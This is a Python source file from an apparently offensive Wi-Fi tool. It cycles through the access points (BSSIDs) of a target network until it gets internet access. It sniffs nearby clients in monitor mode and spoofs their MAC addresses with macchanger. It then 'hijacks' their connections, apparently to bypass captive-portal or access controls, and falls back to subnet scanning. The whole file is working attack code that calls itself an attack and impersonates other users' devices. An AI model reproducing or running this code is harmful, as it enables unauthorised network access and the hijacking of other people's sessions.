"""
Library/kyk.py - Sequential multi-BSSID exploration & scanning until internet access is granted.
"""

import sys
import time

from .utils import (
    _run,
    log_info,
    log_plus,
    log_warning,
    log_minus,
    log_main,
    log_hijack,
    clear_window,
    set_restore_params,
    register_signal_handler,
    ask_proceed,
    ask_restore
)
from .adapter import (
    has_internet,
    wait_for_carrier,
    hijack,
    restore,
    query_dhcp_lease_ip
)
from .scanner import run_scan, auto_detect_network_params, resolve_mac_to_ip

from .wifi import (
    get_active_profile,
    get_ssid_for_profile,
    scan_bssids_for_ssid,
    lock_bssid,
    restore_auto
)

from .air_scanner import sniff_air_clients


def calculate_bssid_score(bssid_item, air_clients_map=None):
    """
    Calculates auto-selection score for a BSSID based on:
    1. Number of captured clients (the more clients, the higher score / priority)
    2. Signal strength percentage (the better signal, the higher score)
    """
    bssid_mac = bssid_item["bssid"].lower()

    try:
        import re
        signal_pct = int(re.sub(r"[^\d]", "", str(bssid_item.get("signal", 0))))
    except Exception:
        signal_pct = 0

    client_count = 0
    if air_clients_map and bssid_mac in air_clients_map:
        client_count = len(air_clients_map[bssid_mac])

    # Score formula: Heavily weight client count so BSSIDs with clients rank first,
    # and break ties/rank remaining BSSIDs using signal strength percentage.
    score = (client_count * 1000) + signal_pct
    return score, client_count, signal_pct


def run_kyk(args):
    """
    Main subcommand handler for KYK mode.
    Connects to each available BSSID for the target SSID one by one,
    checking for internet access or scanning until internet access is granted.
    Supports --air over-the-air 802.11 monitor mode client discovery & direct takeover.
    """
    register_signal_handler()

    profile = getattr(args, "profile", None) or get_active_profile()
    if not profile:
        log_main("[-] Error: Could not auto-detect active Wi-Fi profile. Specify -p/--profile.")
        sys.exit(1)

    ssid = get_ssid_for_profile(profile)
    if not ssid:
        log_main(f"[-] Error: Could not determine SSID for profile '{profile}'.")
        sys.exit(1)

    interface = getattr(args, "interface", None) or "wlan0"
    air_arg = getattr(args, "air", None)
    is_air = air_arg is not None
    air_duration = 25

    if is_air:
        if isinstance(air_arg, int) and air_arg > 0:
            air_duration = air_arg
        elif sys.stdin.isatty():
            try:
                val = input("Enter duration in seconds to listen in monitor mode [default: 25]: ").strip()
                if val.isdigit() and int(val) > 0:
                    air_duration = int(val)
            except (KeyboardInterrupt, EOFError):
                pass

    log_main("========================================", clear=True)
    log_main("       KYK MULTI-BSSID EXPLORATION      ")
    log_main("========================================")
    log_main(f"Interface      : {interface}")
    log_main(f"Active Profile : {profile}")
    log_main(f"Wi-Fi SSID     : {ssid}")
    log_main(f"Air Sniff Mode : {'ENABLED (' + str(air_duration) + 's)' if is_air else 'DISABLED'}")
    log_main("========================================\n")

    # 1. Initial internet check
    if has_internet():
        if not getattr(args, "force", False):
            log_plus("Internet access is already active on current connection!")
            log_main("[+] Internet access is already active on current connection!")
            return True
        else:
            log_info("Internet access is already active, but --force is enabled. Continuing exploration...")
            log_main("[!] Internet access is active, but --force is enabled. Continuing exploration...")

    # 2. Discover BSSIDs for the SSID
    bssids = scan_bssids_for_ssid(ssid)
    if not bssids:
        log_warning(f"No available BSSIDs found in scan for SSID '{ssid}'.")
        log_main(f"[-] No available BSSIDs found in scan for SSID '{ssid}'.")
        return False

    log_info(f"Discovered {len(bssids)} BSSID(s) for network '{ssid}'. Starting exploration...")
    log_main(f"[+] Discovered {len(bssids)} BSSID(s) for network '{ssid}':")

    # 3. If --air mode is enabled, sniff over-the-air Dot11 frames in monitor mode FIRST
    air_clients_map = {}
    if is_air:
        target_bssid_list = [b["bssid"] for b in bssids]
        air_clients_map = sniff_air_clients(target_bssid_list, interface=interface, duration=air_duration)

    # 4. Auto-rank BSSIDs by client count & signal strength (highest score first)
    bssids.sort(key=lambda b: calculate_bssid_score(b, air_clients_map)[0], reverse=True)

    log_info("Auto-selected BSSID ordering (Ranked by client count & signal strength):")
    log_main("\n========================================")
    log_main("    AIR AUTO-SELECTED BSSID RANKING     ")
    log_main("========================================")
    for rank, b in enumerate(bssids, start=1):
        score, clients, sig = calculate_bssid_score(b, air_clients_map)
        log_main(f"  Rank #{rank}: BSSID {b['bssid']} | Score: {score:<4} | Clients: {clients:<2} | Signal: {sig}% | Ch: {b['chan']}")
    log_main("========================================\n")

    if getattr(args, "select_bssid", False):
        log_main("\n========================================")
        log_main("       DISCOVERED BSSIDS LIST           ")
        log_main("========================================")
        for i, b in enumerate(bssids, start=1):
            score, clients, sig = calculate_bssid_score(b, air_clients_map)
            log_main(f"  [{i}] BSSID: {b['bssid']}  (Clients: {clients}, Signal: {sig}%, Channel: {b['chan']})")
        log_main("========================================\n")

        selected_idx = 0
        try:
            sys.stdout.write(f"\033[93m[?] Enter starting BSSID number [1-{len(bssids)}, default: 1]: \033[0m")
            sys.stdout.flush()
            val = sys.stdin.readline().strip()
            if val.isdigit():
                num = int(val)
                if 1 <= num <= len(bssids):
                    selected_idx = num - 1
        except (KeyboardInterrupt, EOFError):
            sys.stdout.write("\n")
            pass

        if selected_idx > 0:
            bssids = bssids[selected_idx:] + bssids[:selected_idx]
            log_info(f"Selected starting BSSID: {bssids[0]['bssid']}")
            log_main(f"[+] Selected starting BSSID: {bssids[0]['bssid']}")

    tried_macs = set()
    last_skip_time = 0

    for idx, item in enumerate(bssids, start=1):
        target_bssid = item["bssid"]
        signal_pct = item["signal"]
        chan = item["chan"]

        try:
            # Clear scan & hijack windows for new BSSID
            clear_window("hijack")
            clear_window("scan")

            msg = f"[{idx}/{len(bssids)}] Target BSSID: {target_bssid} (Sig: {signal_pct}%, Ch: {chan})"
            log_info(msg)
            log_main(f"\n{msg}")

            # Lock connection to this BSSID
            lock_bssid(target_bssid, profile)

            # Wait deterministically for adapter link readiness
            wait_for_carrier(interface, timeout=6.0)

            # Check if internet access is available immediately
            if has_internet():
                log_plus(f"KYK SUCCESS! Internet verified on BSSID {target_bssid}!")
                log_main(f"\033[92m[+] KYK SUCCESS! Internet verified on BSSID {target_bssid}!\033[0m")
                if not getattr(args, "force", False):
                    return True
                else:
                    log_info(f"--force is enabled. Continuing attack on BSSID {target_bssid}...")
                    log_main(f"[!] --force is enabled. Continuing attack on BSSID {target_bssid}...")

            # If over-the-air client targets were caught for this BSSID, impersonate each new target MAC directly
            bssid_air_clients = air_clients_map.get(target_bssid.lower(), {})
            auto_params = auto_detect_network_params(target_iface=interface)
            gw_mac_clean = (auto_params.get("gateway_mac") or "").lower()
            local_mac_clean = (auto_params.get("local_mac") or "").lower()
            all_bssids_clean = {b["bssid"].lower() for b in bssids}

            new_air_clients = {
                mac: ip for mac, ip in bssid_air_clients.items()
                if mac.lower() not in tried_macs
                and mac.lower() not in all_bssids_clean
                and mac.lower() != gw_mac_clean
                and mac.lower() != local_mac_clean
            }

            if new_air_clients:
                log_info(f"Testing {len(new_air_clients)} air target MAC(s)...")
                log_main(f"  -> Testing {len(new_air_clients)} air target MAC(s)...")

                auto_ip = auto_params.get("local_ip") or "10.68.193.222"
                gw_ip = auto_params.get("gateway_ip", "")
                netmask = auto_params.get("cidr", "").split("/")[1] if auto_params.get("cidr") and "/" in auto_params.get("cidr") else "21"
                broadcast = auto_params.get("broadcast", "")
                local_mac = auto_params.get("local_mac", "")
                ipmask = auto_params.get("cidr", f"{auto_ip}/{netmask}")

                set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore)

                for client_mac, client_ip in new_air_clients.items():
                    tried_macs.add(client_mac.lower())

                    resolved_ip = client_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
                    
                    # Guaranteed IP Resolution via DHCP Lease Query after MAC spoofing
                    if not resolved_ip:
                        log_info(f"Querying DHCP lease for air target MAC {client_mac}...")
                        log_hijack(f"[*] Querying DHCP lease for air target MAC {client_mac}...")
                        _run(f"ip link set dev {interface} down", debug=False)
                        _run(f"macchanger -m {client_mac} {interface}", debug=False)
                        _run(f"ip link set dev {interface} up", debug=False)
                        wait_for_carrier(interface, timeout=5.0)
                        resolved_ip = query_dhcp_lease_ip(interface)

                    target_ip = resolved_ip or auto_ip

                    hijack_success = hijack(interface, target_ip, client_mac, netmask, broadcast, gw_ip, max_retries=2)
                    if hijack_success:
                        log_plus(f"KYK SUCCESS! Internet granted via {client_mac} on BSSID {target_bssid}!")
                        log_main(f"\033[92m[+] KYK SUCCESS! Internet granted via {client_mac} on BSSID {target_bssid}!\033[0m")
                        if not getattr(args, "force", False):
                            return True

                    if getattr(args, "force", False):
                        if not ask_proceed():
                            log_warning("User requested to stop attack after impersonation.")
                            log_main("[-] User requested to stop attack after impersonation.")
                            has_acc = hijack_success or has_internet()
                            if ask_restore(default_restore=not has_acc):
                                restore(interface, local_mac, ipmask, broadcast, gw_ip)
                            else:
                                log_plus("Keeping current MAC and network configuration.")
                            return has_acc

                    time.sleep(0.5)

                # Restore original interface MAC/IP after testing air targets
                has_acc = has_internet()
                if getattr(args, "force", False):
                    if ask_restore(default_restore=not has_acc):
                        restore(interface, local_mac, ipmask, broadcast, gw_ip)
                    else:
                        log_plus("Keeping current MAC and network configuration.")
                else:
                    if not has_acc:
                        restore(interface, local_mac, ipmask, broadcast, gw_ip)
                    else:
                        log_plus("Internet verified. Preserving working MAC and network configuration.")

            # Run subnet scanning on this BSSID if air targets didn't yield internet
            log_info(f"Scanning subnet block on BSSID {target_bssid}...")
            log_main(f"  -> Scanning subnet block on BSSID {target_bssid}...")
            log_hijack(f"[*] Moving to active subnet enumeration scan on BSSID {target_bssid}...")
            setattr(args, "interface", interface)
            success = run_scan(args, quiet_header=True)

            if success or (has_internet() and not getattr(args, "force", False)):
                log_plus(f"KYK SUCCESS! Internet access granted via BSSID {target_bssid}!")
                log_main(f"\033[92m[+] KYK SUCCESS! Internet access granted via BSSID {target_bssid}!\033[0m")
                if not getattr(args, "force", False):
                    return True

            log_warning(f"No internet on BSSID {target_bssid}. Moving next...")
            log_main(f"  [-] No internet on BSSID {target_bssid}. Moving next...")

        except KeyboardInterrupt:
            now = time.time()
            if now - last_skip_time < 1.5:
                log_warning("Double Ctrl+C detected. Exiting KYK exploration...")
                log_main("[-] Double Ctrl+C detected. Exiting KYK exploration...")
                restore_auto(profile)
                raise

            last_skip_time = now
            log_warning(f"Ctrl+C pressed! Skipping BSSID {target_bssid}...")
            log_main(f"\033[93m[-] Ctrl+C pressed! Skipping BSSID {target_bssid}...\033[0m")
            try:
                auto_params = auto_detect_network_params(target_iface=interface)
                gw_ip = auto_params.get("gateway_ip", "")
                local_mac = auto_params.get("local_mac", "")
                ipmask = auto_params.get("cidr", "")
                broadcast = auto_params.get("broadcast", "")
                if interface and local_mac and ipmask:
                    restore(interface, local_mac, ipmask, broadcast, gw_ip)
            except Exception:
                pass
            time.sleep(0.5)
            continue

    log_warning("KYK completed scanning all available BSSIDs without securing internet access.")
    log_main("[-] KYK completed scanning all available BSSIDs without securing internet access.")
    log_info("Restoring auto-roaming on profile...")
    restore_auto(profile)
    return False





